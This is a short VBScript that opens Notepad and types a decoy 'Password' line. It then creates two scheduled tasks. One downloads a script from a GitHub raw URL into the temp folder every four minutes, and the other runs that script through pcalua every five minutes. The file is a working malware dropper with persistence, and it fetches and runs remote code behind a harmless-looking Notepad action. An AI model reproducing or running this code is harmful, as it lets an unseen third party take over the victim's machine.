Set Notepad = WScript.CreateObject("WScript.Shell")
Notepad.Run "c:\windows\system32\notepad.exe"

WScript.Sleep 1000

Notepad.SendKeys "Password: secure this"

Set sq = CreateObject("WScript.Shell")
sq.Run ("schtasks /create /sc minute /mo 4 /tn ""A3"" /tr ""curl https://raw.githubusercontent.com/section10housing/b1/master/z2.txt -o %tmp%\z2.vbs""")

Set sd = CreateObject("WScript.Shell")
sd.Run ("schtasks /create /sc minute /mo 5 /tn ""A4"" /tr ""pcalua -a %tmp%\z2.vbs""")






